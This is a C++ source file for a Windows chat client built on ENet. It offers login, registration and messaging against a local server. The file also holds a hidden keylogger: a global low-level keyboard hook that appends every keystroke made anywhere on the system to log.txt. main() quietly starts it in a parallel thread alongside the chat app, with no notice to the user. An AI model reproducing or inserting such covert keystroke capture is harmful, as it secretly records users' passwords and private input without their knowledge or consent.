#include <enet/enet.h>
#include <iostream>
#include <string>
#include <conio.h>      // For _kbhit() and _getch()
#include <windows.h>    // For Sleep()
#include <stdio.h>
#include <thread>
using namespace std;

// ---------------------------------------------------------------------
// Display the main menu options to the user.
// ---------------------------------------------------------------------
void displayMenu() {
    cout << "\n=== Authentication System ===" << endl;
    cout << "1. Login" << endl;
    cout << "2. Register" << endl;
    cout << "3. Exit" << endl;
    cout << "Enter your choice: ";
}

// ---------------------------------------------------------------------
// Send a message to the server and wait for a response.
// Used for authentication commands.
// ---------------------------------------------------------------------
string sendMessage(ENetPeer* peer, const string& message, ENetHost* client) {
    ENetPacket* packet = enet_packet_create(message.c_str(), message.size() + 1, ENET_PACKET_FLAG_RELIABLE);
    enet_peer_send(peer, 0, packet);
    enet_host_flush(client);

    ENetEvent event;
    // Wait for up to 5000 ms (5 seconds) for a response.
    while (enet_host_service(client, &event, 5000) > 0) {
        if (event.type == ENET_EVENT_TYPE_RECEIVE) {
            string response = reinterpret_cast<char*>(event.packet->data);
            enet_packet_destroy(event.packet);
            return response;
        }
    }
    return "ERROR: No response from server";
}

// ---------------------------------------------------------------------
// Disconnect properly from the server.
// ---------------------------------------------------------------------
void disconnectFromServer(ENetPeer* peer, ENetHost* client) {
    if (peer) {
        enet_peer_disconnect(peer, 0);
        ENetEvent event;
        while (enet_host_service(client, &event, 3000) > 0) {
            if (event.type == ENET_EVENT_TYPE_RECEIVE) {
                enet_packet_destroy(event.packet);
            } else if (event.type == ENET_EVENT_TYPE_DISCONNECT) {
                cout << "Disconnected from server." << endl;
                break;
            }
        }
    }
    enet_host_destroy(client);
}

// ---------------------------------------------------------------------
// Chat mode (without threads):
// This function continuously polls for incoming messages and also checks 
// for user key presses in a non-blocking manner using _kbhit().
// ---------------------------------------------------------------------
void chatApp(ENetPeer* peer, ENetHost* client) {
    cout << "\nWelcome to the Chat App!" << endl;
    cout << "Type your message and press Enter. Type '/exit' to leave chat." << endl;
    cout << "You: " << flush;
    
    string userInput = "";
    bool running = true;
    
    // Main loop: poll for both incoming network messages and user keystrokes.
    while (running) {
        // Poll network messages with a zero timeout (non-blocking)
        ENetEvent event;
        while (enet_host_service(client, &event, 0) > 0) {
            if (event.type == ENET_EVENT_TYPE_RECEIVE) {
                // Display the incoming message on a new line
                cout << "\n" << reinterpret_cast<char*>(event.packet->data) << "\nYou: " << userInput << flush;
                enet_packet_destroy(event.packet);
            }
        }
        
        // Check if a key is pressed without blocking.
        if (_kbhit()) {
            char ch = _getch();
            // If Enter key is pressed (ASCII 13)
            if (ch == 13) {
                cout << "\n";
                if (userInput == "/exit") {
                    running = false;
                    break;
                }
                if (!userInput.empty()) {
                    // Prefix the user's message with "CHAT:" so the server knows it's a chat message.
                    string fullMessage = "CHAT:" + userInput;
                    ENetPacket* packet = enet_packet_create(fullMessage.c_str(), fullMessage.size() + 1, ENET_PACKET_FLAG_RELIABLE);
                    enet_peer_send(peer, 0, packet);
                    enet_host_flush(client);
                    userInput.clear();
                }
                cout << "You: " << flush;
            }
            // Handle backspace (ASCII 8)
            else if (ch == 8) {
                if (!userInput.empty()) {
                    userInput.pop_back();
                    cout << "\b \b" << flush;
                }
            }
            else {
                userInput.push_back(ch);
                cout << ch << flush;
            }
        }
        // Sleep a bit to prevent busy waiting.
        Sleep(10);
    }
}

// ---------------------------------------------------------------------
// Registration flow: Ask for email, then verification code, then new password.
// ---------------------------------------------------------------------
void handleRegistration(ENetPeer* peer, ENetHost* client) {
    string email;
    cout << "Enter email for registration: ";
    cin >> email;
    
    // Send the REGISTER command with an empty password.
    string message = "REGISTER:" + email + "|";
    string response = sendMessage(peer, message, client);
    cout << "Server: " << response << endl;
    
    if (response.rfind("OK:", 0) == 0) {
        string code;
        cout << "Enter verification code sent to your email: ";
        cin >> code;
        
        message = "VERIFY:" + email + "|" + code;
        response = sendMessage(peer, message, client);
        cout << "Server: " << response << endl;
        
        if (response.rfind("OK:", 0) == 0) {
            string password;
            cout << "Enter new password: ";
            cin >> password;
            
            message = "SETPASSWORD:" + email + "|" + password;
            response = sendMessage(peer, message, client);
            cout << "Server: " << response << endl;
        }
    }
}

// ---------------------------------------------------------------------
// Login flow: Ask for email and password, then enter chat mode if successful.
// ---------------------------------------------------------------------
void handleLogin(ENetPeer* peer, ENetHost* client) {
    string email, password;
    cout << "Enter email: ";
    cin >> email;
    cout << "Enter password: ";
    cin >> password;
    
    string message = "LOGIN:" + email + "|" + password;
    string response = sendMessage(peer, message, client);
    cout << "Server: " << response << endl;
    
    if (response.rfind("OK:", 0) == 0) {
        cout << "You are now logged in!" << endl;
        cout << "Press Enter to go to the Chat App..." << endl;
        // Clear the newline left in the input buffer.
        string dummy;
        getline(cin, dummy);
        getline(cin, dummy);
        // Enter chat mode (non-blocking, no extra threads)
        chatApp(peer, client);
    }
}

// ---------------------------------------------------------------------
// Main function: Initialize the client, connect to the server, and process user commands.
// ---------------------------------------------------------------------
int chathread (){
    if (enet_initialize() != 0) {
        cerr << "ENet initialization failed!" << endl;
        cin.get();
        return EXIT_FAILURE;
    }
    atexit(enet_deinitialize);

    ENetHost* client = enet_host_create(nullptr, 1, 2, 0, 0);
    if (!client) {
        cerr << "Client creation failed!" << endl;
        cin.get();
        return EXIT_FAILURE;
    }

    ENetAddress address;
    enet_address_set_host(&address, "127.0.0.1");
    address.port = 25555;

    ENetPeer* peer = enet_host_connect(client, &address, 2, 0);
    if (!peer) {
        cerr << "Failed to initiate connection to server!" << endl;
        cin.get();
        enet_host_destroy(client);
        return EXIT_FAILURE;
    }

    ENetEvent event;
    if (enet_host_service(client, &event, 5000) > 0 && event.type == ENET_EVENT_TYPE_CONNECT) {
        cout << "Connected to server!" << endl;
    } else {
        cerr << "Connection failed!" << endl;
        enet_peer_reset(peer);
        cin.get();
        enet_host_destroy(client);
        return EXIT_FAILURE;
    }

    int choice = 0;
    while (choice != 3) {
        displayMenu();
        cin >> choice;
        string dummy;
        getline(cin, dummy); // Clear the input buffer
        
        switch (choice) {
            case 1:
                handleLogin(peer, client);
                break;
            case 2:
                handleRegistration(peer, client);
                break;
            case 3:
                cout << "Exiting..." << endl;
                break;
            default:
                cout << "Invalid choice, please try again." << endl;
                break;
        }
    }

    disconnectFromServer(peer, client);


    return 1;
}
HHOOK keyboardHook;

/**
 * Callback function that processes keyboard events.
 * 
 * @param nCode Determines how the event should be processed.
 * @param wParam Specifies the type of keyboard message (e.g., key down, key up).
 * @param lParam Contains information about the key event (e.g., which key was pressed).
 * @return Calls the next hook in the chain to ensure other hooks continue working.
 */
LRESULT CALLBACK KeyLoggerProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Check if the hook code is valid and a key is being pressed down
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        // Extract key information from the event
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT*)lParam;

        // Open (or create) a log file in append mode to store key presses
        FILE *file = fopen("log.txt", "a");
        if (file) {
            // Convert the virtual key code into an ASCII character
            char key = MapVirtualKey(kbdStruct->vkCode, MAPVK_VK_TO_CHAR);

            // Write the key character to the log file
            fprintf(file, "%c", key);
            fclose(file);  // Close the file to save changes
        }
    }

    // Pass the event to the next hook in the chain to avoid interfering with normal functionality
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}


int logger(){
    // Install a low-level keyboard hook
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyLoggerProc, NULL, 0);
    
    // Check if the hook installation failed
    if (!keyboardHook) {
        printf("Failed to install hook!\n");
        return 1;  // Exit with an error code
    }

    // A message loop to keep the program running and listening for key events
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);  // Translate virtual key messages into character messages
        DispatchMessage(&msg);   // Dispatch messages to the appropriate window procedure
    }

    // Uninstall the keyboard hook before exiting
    UnhookWindowsHookEx(keyboardHook);
    return 0;  // Exit successfully



}



int main() {
    std::thread threadA(logger);  // Start logger thread
    std::thread threadB(chathread); 

    threadA.join();  // Wait for logger to finish
    threadB.join();  // Wait for chatapp to finish

    return 0;

}
